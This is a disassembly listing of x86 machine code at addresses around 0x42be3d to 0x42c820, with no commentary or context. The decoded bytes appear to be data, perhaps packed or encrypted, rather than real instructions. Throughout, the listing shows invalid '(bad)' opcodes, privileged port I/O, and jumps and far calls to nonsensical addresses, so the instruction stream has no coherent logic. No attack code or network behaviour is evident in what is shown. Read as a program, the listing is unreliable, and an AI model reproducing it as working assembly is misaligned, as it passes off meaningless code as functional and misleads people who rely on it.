  42be3d:	push   ss
  42be3e:	gs mov ebx,0x2cb7d218
  42be44:	and    DWORD PTR [edi-0x6a],0x15
  42be48:	add    eax,0x6bdcba29
  42be4d:	fs retf 0x6c01
  42be51:	and    DWORD PTR [ecx],eax
  42be53:	mul    edi
  42be55:	jge    0x42be11
  42be57:	jl     0x42beb9
  42be59:	adc    al,0x23
  42be5b:	jbe    0x42be10
  42be5d:	add    bh,BYTE PTR [ecx-0x5386cf91]
  42be63:	fbstp  TBYTE PTR [eax+0x3b]
  42be66:	and    bh,dl
  42be68:	jecxz  0x42beb1
  42be6a:	or     ecx,DWORD PTR [edi]
  42be6c:	div    BYTE PTR [edx]
  42be6e:	xchg   ebx,eax
  42be6f:	fdivr  DWORD PTR [ebp-0x5e88216c]
  42be75:	dec    esi
  42be76:	ins    BYTE PTR es:[edi],dx
  42be77:	loop   0x42be0f
  42be79:	add    ah,al
  42be7b:	push   esp
  42be7c:	test   ah,dh
  42be7e:	fidivr WORD PTR [ebx]
  42be80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be81:	nop
  42be82:	pop    esi
  42be83:	or     DWORD PTR [esi-0x7f],ebp
  42be86:	js     0x42bf01
  42be88:	dec    esp
  42be89:	and    DWORD PTR [esi],esi
  42be8b:	sbb    DWORD PTR [ebp+0x14bb34],0x0
	...
  42bef2:	add    BYTE PTR [eax],al
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0x6e7bd7c8,eax
  42bf01:	icebp  
  42bf02:	outs   dx,DWORD PTR ds:[esi]
  42bf03:	in     al,0xdc
  42bf05:	aad    0x1
  42bf07:	add    BYTE PTR [ecx+eax*1],al
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	lds    edx,FWORD PTR [edi+0x52]
  42bf0f:	ja     0x42befb
  42bf11:	dec    esi
  42bf12:	les    esi,FWORD PTR [esi+ebp*1-0x57]
  42bf16:	in     al,0x73
  42bf18:	xchg   ebp,eax
  42bf19:	cwde   
  42bf1a:	push   ecx
  42bf1b:	out    dx,eax
  42bf1c:	aam    0x87
  42bf1e:	push   esi
  42bf1f:	pop    ecx
  42bf20:	add    BYTE PTR [ebp-0x31],dl
  42bf23:	jmp    eax
  42bf25:	in     eax,0xf5
  42bf27:	sub    bl,ah
  42bf29:	aad    0x70
  42bf2b:	xchg   edi,eax
  42bf2c:	jge    0x42bf22
  42bf2e:	mov    ecx,0x51a2ba41
  42bf33:	push   ecx
  42bf34:	popf   
  42bf35:	adc    ah,cl
  42bf37:	ret    0xcea7
  42bf3a:	pop    esi
  42bf3b:	test   eax,0x6cdbf3a8
  42bf40:	jl     0x42bf90
  42bf42:	jnp    0x42bf6b
  42bf44:	mov    ebp,0x9a4b79fe
  42bf49:	pop    edx
  42bf4a:	(bad)  
  42bf4b:	cmp    dl,BYTE PTR [esi]
  42bf4d:	dec    ebx
  42bf4e:	push   ss
  42bf4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf50:	or     al,0xf0
  42bf52:	test   DWORD PTR [ebx+0x4d4a5a3f],0x959e8cf6
  42bf5c:	mov    bh,0xf
  42bf5e:	cmp    edi,eax
  42bf60:	inc    ebp
  42bf62:	sub    al,0x45
  42bf64:	or     al,0x76
  42bf66:	xchg   al,ch
  42bf68:	popa   
  42bf69:	pusha  
  42bf6a:	mov    ?,ebp
  42bf6c:	stos   DWORD PTR es:[edi],eax
  42bf6d:	fidiv  DWORD PTR ds:0xae62fbdf
  42bf73:	ficom  WORD PTR [esi]
  42bf75:	lods   eax,DWORD PTR ds:[esi]
  42bf76:	xor    eax,0x7e01fc8
  42bf7b:	jg     0x42bf8c
  42bf7d:	push   esi
  42bf7e:	xchg   di,ax
  42bf80:	push   ebp
  42bf81:	jp     0x42bfce
  42bf83:	(bad)  
  42bf84:	in     al,dx
  42bf85:	mov    dl,0x92
  42bf87:	mov    ds:0xfaac7fcd,al
  42bf8c:	sbb    al,0x63
  42bf8e:	or     DWORD PTR [ecx],0x5e
  42bf91:	push   ebp
  42bf92:	sbb    cl,bl
  42bf94:	lds    edi,FWORD PTR [ebx+0x32]
  42bf97:	pop    ecx
  42bf98:	inc    bx
  42bf9a:	pop    ds
  42bf9b:	adc    eax,0xbbb643f2
  42bfa0:	push   esi
  42bfa1:	jmp    0x42bf5e
  42bfa3:	out    dx,al
  42bfa4:	cmp    ebx,esi
  42bfa6:	jg     0x42bf92
  42bfa8:	dec    esp
  42bfa9:	mov    ds:0xbaecb6eb,eax
  42bfae:	daa    
  42bfaf:	inc    ecx
  42bfb0:	adc    esp,DWORD PTR [eax]
  42bfb2:	xor    ebx,DWORD PTR [esi]
  42bfb4:	aad    0x31
  42bfb6:	dec    esp
  42bfb7:	in     eax,0xa6
  42bfb9:	cmp    BYTE PTR [ecx-0x6856b389],0x7b
  42bfc0:	fwait
  42bfc1:	js     0x42bfb3
  42bfc3:	xchg   BYTE PTR [edx],al
  42bfc5:	js     0x42bf65
  42bfc7:	xchg   BYTE PTR [edx-0x71],bl
  42bfca:	mov    ebx,0x171000b4
  42bfcf:	jmp    0xeac1:0xc904ae6f
  42bfd6:	rol    DWORD PTR [esi+0x3b],1
  42bfd9:	cli    
  42bfda:	inc    eax
  42bfdb:	jmp    0x1d00c682
  42bfe0:	iret   
  42bfe1:	mov    esi,0xdb1fa305
  42bfe6:	dec    ebx
  42bfe7:	cmp    al,0x77
  42bfe9:	stos   DWORD PTR es:[edi],eax
  42bfea:	rol    BYTE PTR [ebp-0xd],0x2f
  42bfee:	test   eax,0x48f60be9
  42bff3:	jmp    0xf07ea98e
  42bff8:	adc    al,0x59
  42bffa:	mov    bh,0x5
  42bffc:	jo     0x42bfcf
  42bffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfff:	in     eax,0x85
  42c001:	add    al,0x87
  42c003:	adc    ch,0x83
  42c006:	ror    BYTE PTR [ebx+0x5c793e91],0x52
  42c00d:	add    eax,DWORD PTR [ebp+0x54]
	...
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	scas   al,BYTE PTR es:[edi]
  42c081:	sbb    al,0xcd
  42c083:	push   0x1d6e0
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	scas   eax,DWORD PTR es:[di]
  42c08e:	jecxz  0x42c0cb
  42c090:	(bad)
  42c093:	inc    edi
  42c094:	mov    bl,0xfd
  42c096:	push   0x41
  42c098:	(bad)  
  42c099:	jmp    0x5050dda5
  42c09e:	and    dl,bl
  42c0a0:	pop    ecx
  42c0a1:	mov    ebp,0xe4e5ad71
  42c0a6:	(bad)  
  42c0a7:	cmp    al,BYTE PTR [ebp+0x683fb2cd]
  42c0ad:	jnp    0x42c05b
  42c0af:	and    eax,DWORD PTR [ebx]
  42c0b1:	shl    DWORD PTR [eax-0x2799bdc],1
  42c0b7:	and    cl,0xae
  42c0ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0bb:	out    dx,al
  42c0bc:	aad    0x17
  42c0be:	js     0x42c040
  42c0c0:	call   0x577d:0x696651c3
  42c0c7:	call   0x88dc35cb
  42c0cc:	adc    dl,BYTE PTR [edx-0x6a3c9be8]
  42c0d2:	or     eax,0xc0bf6ab7
  42c0d7:	push   esi
  42c0d8:	mov    al,0x27
  42c0da:	imul   ebp,DWORD PTR [esi-0x14],0x67
  42c0de:	ficom  WORD PTR [ecx+0x3c17fd65]
  42c0e4:	sar    edx,cl
  42c0e6:	mov    esi,0x6642900f
  42c0eb:	jmp    0x42c13f
  42c0ed:	pop    es
  42c0ee:	dec    ecx
  42c0ef:	mov    dh,0xc7
  42c0f1:	aaa    
  42c0f2:	in     eax,dx
  42c0f3:	mov    edx,0xd62ef94e
  42c0f8:	fstp   TBYTE PTR [eax-0x7a0d15d]
  42c0fe:	add    al,0x3d
  42c100:	jmp    0xcd15ec26
  42c105:	test   al,0xf6
  42c107:	mov    ah,0x2a
  42c109:	inc    eax
  42c10a:	test   eax,0xd2c09d2d
  42c10f:	pop    ds
  42c110:	sbb    ebx,DWORD PTR [esp+ebx*4-0x22]
  42c114:	push   esp
  42c115:	inc    esp
  42c116:	inc    esp
  42c117:	inc    ecx
  42c118:	xor    DWORD PTR [eax],ebp
  42c11a:	mov    bh,0xd
  42c11c:	mov    ebx,0x745d1b86
  42c121:	ins    DWORD PTR es:[edi],dx
  42c122:	mov    al,0x84
  42c124:	push   cs
  42c125:	dec    ebp
  42c126:	lock and al,0x17
  42c12a:	mov    dh,0xf1
  42c12c:	pop    esp
  42c12d:	int    0x87
  42c12f:	xchg   ebx,eax
  42c130:	sbb    ah,BYTE PTR [edi+0x33]
  42c133:	cmp    cl,ah
  42c135:	into   
  42c136:	xor    ch,BYTE PTR [eax+0x225b795b]
  42c13c:	orps   xmm0,xmm0
  42c13f:	dec    ecx
  42c140:	jle    0x42c1b5
  42c142:	xor    al,0x91
  42c144:	mov    dh,BYTE PTR [ebx-0x49]
  42c147:	mov    edx,DWORD PTR [eax+0x23]
  42c14a:	push   ds
  42c14b:	push   esp
  42c14c:	xchg   edx,eax
  42c14d:	(bad)  [esi]
  42c14f:	mov    eax,ds:0x5bfba2c0
  42c154:	(bad)
  42c158:	les    ecx,FWORD PTR fs:[esi-0x7400df0a]
  42c15f:	int    0x4b
  42c161:	fcomp  DWORD PTR [edi+0x31]
  42c164:	push   ss
  42c165:	or     dh,ch
  42c167:	mov    ah,0xec
  42c169:	outs   dx,DWORD PTR ds:[esi]
  42c16a:	out    dx,al
  42c16b:	mov    esi,0x39c25ca7
  42c170:	mov    BYTE PTR ss:[ebp-0x4f],cl
  42c174:	daa    
  42c175:	stos   BYTE PTR es:[edi],al
  42c176:	mov    ecx,0x4b457f82
  42c17b:	inc    ebp
  42c17c:	inc    esi
  42c17d:	sub    DWORD PTR [ecx-0x6d110e6c],esi
  42c183:	ret    
  42c184:	push   es
  42c185:	push   ecx
  42c186:	push   esp
  42c187:	ret    0x4ed3
  42c18a:	sbb    edi,DWORD PTR [esi]
  42c18c:	xor    eax,0x7b02cd
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	sub    ecx,DWORD PTR [edx-0x281bd456]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	xor    BYTE PTR [ecx+0x11],dh
  42c20f:	enter  0xe64c,0x11
  42c213:	shrd   edx,ebp,0x98
  42c217:	add    BYTE PTR [ebx+eiz*4+0x7b69cb3b],0x1c
  42c21f:	in     al,0x92
  42c221:	and    cl,ah
  42c223:	jecxz  0x42c28c
  42c225:	aad    0x6e
  42c227:	dec    ecx
  42c228:	xchg   ecx,eax
  42c229:	mov    al,ds:0x72933fc3
  42c22e:	mov    es,WORD PTR ds:0xc388d34e
  42c234:	(bad)  
  42c236:	mov    esp,0x733d38ed
  42c23b:	mov    esp,0x86059b66
  42c240:	mov    edx,0xbdd90b7b
  42c245:	fild   QWORD PTR [ebp+0x37aa4a59]
  42c24b:	pop    ebx
  42c24c:	fcom   QWORD PTR [eax-0x5b]
  42c24f:	sbb    ah,BYTE PTR [ebp-0x7df60705]
  42c255:	out    0x38,al
  42c257:	sbb    edi,ebp
  42c259:	das    
  42c25a:	call   0x91860330
  42c25f:	push   edi
  42c260:	pop    esp
  42c261:	dec    esi
  42c262:	sub    dh,BYTE PTR [eax-0xd]
  42c265:	push   edi
  42c266:	sub    edi,DWORD PTR [esi]
  42c268:	adc    DWORD PTR [ecx-0x64],ebp
  42c26b:	les    esp,FWORD PTR [ebx-0x41]
  42c26e:	mov    ds:0x5a73a22,eax
  42c273:	mov    al,ds:0x88444eb1
  42c278:	dec    eax
  42c279:	loop   0x42c2f7
  42c27b:	sbb    esi,DWORD PTR [edx+0x35]
  42c27e:	mov    dl,dh
  42c280:	in     eax,dx
  42c281:	inc    edx
  42c282:	sbb    DWORD PTR [edx-0x40],edx
  42c285:	cmp    edx,esi
  42c287:	jb     0x42c20d
  42c289:	fld    QWORD PTR [eax]
  42c28b:	mov    dl,0x13
  42c28d:	in     al,0x5
  42c28f:	loop   0x42c23e
  42c291:	scas   eax,DWORD PTR es:[edi]
  42c292:	sar    BYTE PTR [edi-0x66],0x9b
  42c296:	mov    dl,0x36
  42c298:	pop    ecx
  42c299:	xchg   edx,eax
  42c29a:	push   ebx
  42c29b:	ins    DWORD PTR es:[edi],dx
  42c29c:	dec    ebp
  42c29d:	das    
  42c29e:	mov    BYTE PTR [ebx+0x6a4e2727],0x3c
  42c2a5:	add    BYTE PTR [edx],dl
  42c2a7:	cmp    al,0x11
  42c2a9:	cwde   
  42c2aa:	sub    DWORD PTR [ebx+0x7b],0xfc0535f0
  42c2b1:	add    BYTE PTR [ebx+0x5b4658f1],bh
  42c2b7:	daa    
  42c2b8:	mov    al,ds:0xe08f0e41
  42c2bd:	jae    0x42c298
  42c2bf:	adc    BYTE PTR ss:[ecx+esi*1],cl
  42c2c3:	call   0x8144c6c9
  42c2c8:	push   ebp
  42c2c9:	mov    ah,0x3
  42c2cb:	fcmovnb st,st(6)
  42c2cd:	(bad)  
  42c2ce:	and    DWORD PTR [ecx-0x1a632640],0x61c91d5c
  42c2d8:	and    BYTE PTR [ebx],dl
  42c2da:	xchg   DWORD PTR [ebx+esi*4-0x31],esi
  42c2de:	adc    esi,DWORD PTR [ebx]
  42c2e0:	dec    ebx
  42c2e1:	jno    0x42c291
  42c2e3:	pop    esp
  42c2e4:	test   al,0x1f
  42c2e6:	fwait
  42c2e7:	pop    ebx
  42c2e8:	push   esi
  42c2e9:	retf   0xdb18
  42c2ec:	sbb    al,0x84
  42c2ee:	jle    0x42c2b6
  42c2f0:	jo     0x42c295
  42c2f2:	bnd je 0x42c2c9
  42c2f5:	sbb    esp,DWORD PTR [esi+0x34]
  42c2f8:	jl     0x761a3d5a
  42c2fe:	xchg   esp,eax
  42c2ff:	cmp    eax,0x814a500c
  42c304:	xchg   DWORD PTR [si+0x48aa],edx
  42c309:	mov    eax,0xdedfedc8
  42c30e:	jns    0x42c2d2
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xf1a244f6
  42c383:	and    ebp,eax
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	repnz cmp al,0x9e
  42c38f:	fwait
  42c390:	inc    eax
  42c391:	out    dx,eax
  42c392:	js     0x42c3ab
  42c394:	stc    
  42c395:	in     eax,0xa2
  42c397:	lods   eax,DWORD PTR ds:[esi]
  42c398:	and    eax,0xea1fd28c
  42c39d:	clc    
  42c39e:	mov    DWORD PTR [edx-0x1c],0x3fb9c7ce
  42c3a5:	mov    ds:0x8d400d61,eax
  42c3aa:	std    
  42c3ab:	adc    DWORD PTR ds:0x6ee68fdc,esi
  42c3b1:	mov    cl,ah
  42c3b3:	stos   BYTE PTR es:[edi],al
  42c3b4:	jge    0x42c41c
  42c3b6:	jno    0x42c3d7
  42c3b8:	icebp  
  42c3b9:	or     al,0x71
  42c3bb:	add    edx,0x5c
  42c3be:	jno    0x42c344
  42c3c0:	dec    edi
  42c3c1:	das    
  42c3c2:	or     BYTE PTR [ecx-0x5b],ch
  42c3c5:	mov    ebx,0xaa4ac7d8
  42c3ca:	pusha  
  42c3cb:	sbb    eax,0x1404fab1
  42c3d0:	or     edi,eax
  42c3d2:	test   eax,0xb7f2bac2
  42c3d7:	mov    ebx,0x450523a1
  42c3dc:	and    edx,DWORD PTR [edi-0x50]
  42c3df:	dec    esi
  42c3e0:	(bad)  
  42c3e1:	int    0xb
  42c3e3:	(bad)  
  42c3e4:	push   esp
  42c3e5:	nop
  42c3e6:	rcr    BYTE PTR [esi-0x5df4bdfe],0x5a
  42c3ed:	in     eax,dx
  42c3ee:	in     eax,0xd0
  42c3f0:	cld    
  42c3f1:	sbb    DWORD PTR [esi+0x12],esp
  42c3f4:	popf   
  42c3f5:	fadd   QWORD PTR [esi+edi*2+0x42]
  42c3f9:	dec    esi
  42c3fa:	xchg   esi,eax
  42c3fb:	add    al,0xd2
  42c3fd:	jg     0x42c3e2
  42c3ff:	repnz outs dx,DWORD PTR ds:[esi]
  42c401:	ret    0xad2c
  42c404:	std    
  42c405:	fstp   TBYTE PTR [edi-0x247d5a42]
  42c40b:	push   ds
  42c40c:	fdiv   DWORD PTR [edi+0x41]
  42c40f:	(bad)  
  42c410:	stc    
  42c411:	jbe    0x42c397
  42c413:	push   ecx
  42c414:	retf   0x461c
  42c417:	stos   BYTE PTR es:[edi],al
  42c418:	sbb    dl,BYTE PTR [eax]
  42c41a:	sbb    DWORD PTR [esi+0x28ce46e],edx
  42c420:	cmp    ch,al
  42c422:	sub    BYTE PTR [ebp-0x7d291182],dh
  42c428:	sbb    BYTE PTR [edi+ebx*4+0x6cfbc9bf],0x6b
  42c430:	cwde   
  42c431:	xchg   esi,eax
  42c432:	pop    ebx
  42c433:	scas   eax,DWORD PTR es:[edi]
  42c434:	jg     0x42c462
  42c436:	mov    ch,0xb0
  42c438:	xchg   ebx,eax
  42c439:	ret    0xd392
  42c43c:	xlat   BYTE PTR ds:[ebx]
  42c43d:	jecxz  0x42c4ad
  42c43f:	dec    esp
  42c440:	loopne 0x42c458
  42c442:	stos   BYTE PTR es:[edi],al
  42c443:	ret    
  42c444:	inc    edx
  42c445:	dec    edx
  42c446:	mov    WORD PTR [esi],es
  42c448:	jecxz  0x42c494
  42c44a:	adc    eax,0x46f7d42a
  42c44f:	mov    dh,0xe1
  42c451:	dec    esi
  42c452:	inc    edi
  42c453:	retf   
  42c454:	xor    DWORD PTR [ebx],ebp
  42c456:	test   al,0xd7
  42c458:	icebp  
  42c459:	hlt    
  42c45a:	call   0xe0a5db6a
  42c45f:	test   bh,bl
  42c461:	arpl   WORD PTR [esi],di
  42c463:	dec    esp
  42c464:	ss inc eax
  42c466:	sbb    ecx,DWORD PTR [eax+edi*2]
  42c469:	or     eax,0x9d34bdd
  42c46e:	xchg   DWORD PTR fs:[ebp+ebp*4-0x7f],edx
  42c473:	aaa    
  42c474:	mov    bh,BYTE PTR [ecx]
  42c476:	out    0x43,eax
  42c478:	push   DWORD PTR [edi-0x34]
  42c47b:	jge    0x42c44e
  42c47d:	sbb    eax,0x684b3e61
  42c482:	in     eax,0xb
  42c484:	dec    ebx
  42c485:	pop    es
  42c486:	pop    ebp
  42c487:	outs   dx,BYTE PTR ds:[esi]
  42c488:	jo     0x42c4b4
  42c48a:	pop    ecx
  42c48b:	sub    al,0xc0
  42c48d:	cmp    eax,0x8a34
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xf134,0x1c
  42c502:	int3   
  42c503:	pop    edx
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	mov    edi,0xdb3299e2
  42c511:	stc    
  42c512:	mov    ds:0x32764328,al
  42c517:	mov    esp,0xdc82914
  42c51c:	sub    eax,0x9f0a6534
  42c521:	je     0x42c569
  42c523:	add    al,0x5d
  42c525:	or     ecx,0xffffffe8
  42c528:	retf   
  42c529:	or     eax,DWORD PTR es:[ebx]
  42c52c:	mov    esi,0xf299fcba
  42c531:	and    bh,bl
  42c533:	or     esi,edx
  42c535:	into   
  42c536:	stos   BYTE PTR es:[edi],al
  42c537:	cmp    dl,BYTE PTR [esi+0x2a48319c]
  42c53d:	push   eax
  42c53e:	mov    edx,0xe78a4c8
  42c543:	jbe    0x42c59b
  42c545:	mov    ebp,0x538f82aa
  42c54a:	jmp    0xe1f579e0
  42c54f:	push   edx
  42c550:	iret   
  42c551:	in     eax,0xca
  42c553:	xor    BYTE PTR [esi-0x5050c870],bl
  42c559:	sbb    eax,0xe47e76bc
  42c55e:	enter  0x3510,0xff
  42c562:	mov    al,ds:0x1000e21f
  42c567:	and    ch,BYTE PTR [ebx+ecx*2+0x2e]
  42c56b:	or     DWORD PTR [edi-0x25],ebp
  42c56e:	sub    al,0x64
  42c570:	push   eax
  42c571:	pop    ds
  42c572:	fisttp WORD PTR [esi+ebx*1]
  42c575:	mov    cl,0xf
  42c577:	push   es
  42c578:	mov    al,0x6e
  42c57a:	imul   DWORD PTR [ebx-0x11]
  42c57d:	cli    
  42c57e:	add    bh,bh
  42c580:	sub    al,ah
  42c582:	xor    eax,0xcf8b8f25
  42c587:	in     eax,0x30
  42c589:	sbb    al,0x7c
  42c58b:	cli    
  42c58c:	push   ss
  42c58d:	jmp    0x2577:0x54fa95e6
  42c594:	adc    DWORD PTR [eax+0x24],ebp
  42c597:	cmp    al,0xdc
  42c599:	add    eax,0xac7f7a84
  42c59e:	ret    
  42c59f:	(bad)  
  42c5a1:	cmp    BYTE PTR [edi-0x1f],0xba
  42c5a5:	lods   eax,DWORD PTR ds:[esi]
  42c5a6:	popf   
  42c5a7:	test   DWORD PTR [esp+esi*2],0x27ab5559
  42c5ae:	repnz sbb al,0x3
  42c5b1:	pop    eax
  42c5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5b3:	mov    bl,0xe7
  42c5b5:	push   eax
  42c5b6:	pop    ss
  42c5b7:	inc    edx
  42c5b8:	jbe    0x42c562
  42c5ba:	pop    ss
  42c5bb:	push   0x25
  42c5bd:	inc    edi
  42c5be:	aaa    
  42c5bf:	shr    DWORD PTR [ecx+ebx*8],0x25
  42c5c3:	(bad)  
  42c5c4:	sbb    esi,DWORD PTR [esi+eiz*2-0x73]
  42c5c8:	ja     0x42c584
  42c5ca:	adc    al,0x5f
  42c5cc:	mov    es,WORD PTR [esi+0x12]
  42c5cf:	jmp    0x42c5b3
  42c5d1:	inc    ebx
  42c5d2:	cmc    
  42c5d3:	sub    eax,0x851a7374
  42c5d8:	jae    0x42c5df
  42c5da:	loope  0x42c615
  42c5dc:	mov    DWORD PTR [esi],esp
  42c5de:	daa    
  42c5df:	and    cl,bl
  42c5e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5e2:	stos   BYTE PTR es:[edi],al
  42c5e3:	clc    
  42c5e4:	aas    
  42c5e5:	stos   BYTE PTR es:[edi],al
  42c5e6:	nop
  42c5e7:	jmp    0xdfa7c1b7
  42c5ec:	lock mov esi,0xfc78422d
  42c5f2:	fdiv   QWORD PTR [eax]
  42c5f4:	icebp  
  42c5f5:	stc    
  42c5f6:	sub    DWORD PTR [eax-0x77030d1b],eax
  42c5fc:	push   esp
  42c5fd:	sar    DWORD PTR [ecx+0x3821220d],cl
  42c603:	jl     0x42c5d0
  42c605:	push   cs
  42c606:	jge    0x42c659
  42c608:	sti    
  42c609:	mov    eax,ds:0x4625c0d5
  42c60e:	sbb    al,0x83
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x116dfc6b]
  42c681:	stc    
  42c682:	push   esi
  42c683:	mov    ecx,0x1daf0
  42c688:	add    al,0x1
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	jbe    0x42c614
  42c68e:	scas   eax,DWORD PTR es:[edi]
  42c68f:	jg     0x42c664
  42c691:	inc    esi
  42c692:	xor    dh,BYTE PTR [ebx]
  42c694:	or     ebx,DWORD PTR [esi]
  42c696:	std    
  42c697:	xchg   ebx,eax
  42c698:	jmp    0xc869:0x42a8a299
  42c69f:	push   eax
  42c6a0:	jp     0x42c640
  42c6a2:	repz cmp ecx,edx
  42c6a5:	dec    ecx
  42c6a6:	inc    esi
  42c6a7:	aam    0x73
  42c6a9:	lahf   
  42c6aa:	popf   
  42c6ab:	cmp    al,BYTE PTR [ecx+0x3b]
  42c6ae:	dec    esp
  42c6af:	dec    ebp
  42c6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6b1:	scas   al,BYTE PTR es:[edi]
  42c6b2:	jl     0x42c657
  42c6b4:	test   eax,0x67f43042
  42c6b9:	std    
  42c6ba:	xor    DWORD PTR [ebx],ecx
  42c6bc:	(bad)  
  42c6bd:	aas    
  42c6be:	(bad)  
  42c6bf:	cmp    DWORD PTR [ebp+0x43],edi
  42c6c2:	sbb    esp,DWORD PTR [esi+0x20048543]
  42c6c8:	adc    eax,ebx
  42c6ca:	test   eax,0x7b8f6081
  42c6cf:	xchg   BYTE PTR [edx+ecx*1],bl
  42c6d2:	arpl   WORD PTR [esi-0x2f],ax
  42c6d5:	xchg   esp,eax
  42c6d6:	mov    eax,0xd2f9ee25
  42c6db:	mov    al,ds:0xc5d505ed
  42c6e0:	jo     0x42c6c9
  42c6e2:	hlt    
  42c6e3:	cmp    al,0x90
  42c6e5:	sbb    al,0x90
  42c6e7:	mov    ah,ah
  42c6e9:	dec    BYTE PTR [esi-0x65fd4f21]
  42c6ef:	aam    0xe0
  42c6f1:	xchg   esp,eax
  42c6f2:	jle    0x42c6b4
  42c6f4:	cmp    dl,ch
  42c6f6:	xor    ch,ah
  42c6f8:	sbb    cl,BYTE PTR [ecx+esi*1+0x41]
  42c6fc:	push   ds
  42c6fd:	call   DWORD PTR [ecx]
  42c6ff:	cmp    al,0x5d
  42c701:	clc    
  42c702:	mov    ah,BYTE PTR [ecx-0x5a]
  42c705:	pushf  
  42c706:	lods   eax,DWORD PTR ds:[esi]
  42c707:	rcr    DWORD PTR [edx-0x4c],cl
  42c70a:	fcmovnu st,st(3)
  42c70c:	je     0x42c783
  42c70e:	push   ss
  42c70f:	push   ss
  42c710:	dec    esi
  42c711:	aad    0x3c
  42c713:	cwde   
  42c714:	push   0x47
  42c716:	rcl    BYTE PTR [edx+0x62],cl
  42c719:	mov    edx,0xca24169c
  42c71e:	and    BYTE PTR [ecx],bl
  42c720:	fiadd  WORD PTR [edx]
  42c722:	sbb    al,BYTE PTR [ebx-0x74]
  42c725:	dec    edx
  42c726:	test   BYTE PTR [edi],bh
  42c728:	pop    ebx
  42c729:	bswap  ebp
  42c72b:	iret   
  42c72c:	mov    BYTE PTR [eax-0x1],0x92
  42c730:	imul   edx,DWORD PTR [ebx-0x34],0x3
  42c734:	rcl    edx,1
  42c736:	(bad)  
  42c737:	sti    
  42c738:	pop    ebx
  42c739:	or     ebp,DWORD PTR [ecx]
  42c73b:	dec    ebp
  42c73c:	push   eax
  42c73d:	shl    BYTE PTR [esi],1
  42c73f:	and    al,0xb4
  42c741:	cwde   
  42c742:	pop    edx
  42c743:	dec    ecx
  42c744:	xor    al,0x20
  42c746:	sbb    al,0x23
  42c748:	or     cl,BYTE PTR [esi-0x2a6d344b]
  42c74e:	sbb    ah,BYTE PTR [edx+0x66]
  42c751:	fwait
  42c752:	dec    esi
  42c753:	sbb    eax,0xac60c616
  42c758:	cld    
  42c759:	xchg   edi,eax
  42c75a:	std    
  42c75b:	(bad)  
  42c75c:	push   ebx
  42c75d:	inc    ebp
  42c75e:	sbb    BYTE PTR [ebx+0x28],ah
  42c761:	dec    ecx
  42c762:	jl     0x42c7a1
  42c764:	test   ebp,esp
  42c766:	in     al,dx
  42c767:	add    edx,0x56
  42c76a:	xchg   ebp,eax
  42c76b:	(bad)  
  42c76c:	jmp    0xd76f:0xf5d1da2c
  42c773:	ins    DWORD PTR es:[edi],dx
  42c774:	sar    DWORD PTR [ecx+0x505ca270],0x34
  42c77b:	push   esp
  42c77c:	fmul   QWORD PTR [esi+0x2c]
  42c77f:	push   esp
  42c780:	test   cl,cl
  42c782:	mov    ch,0x7
  42c784:	out    dx,eax
  42c785:	mov    cl,BYTE PTR [ecx]
  42c787:	es das 
  42c789:	push   ebx
  42c78a:	call   0xf:0x9403631b
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xadc0a40e
  42c802:	or     BYTE PTR [edi-0xc],cl
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	stos   DWORD PTR es:[edi],eax
  42c80d:	(bad)  
  42c80f:	or     al,0xd3
  42c811:	call   0x4fa093e6
  42c816:	pop    esi
  42c817:	sbb    DWORD PTR [edx-0x15],esp
  42c81a:	xor    bh,ch
  42c81c:	xchg   esp,eax
  42c81d:	and    ecx,DWORD PTR [ecx+0x30]
  42c820:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
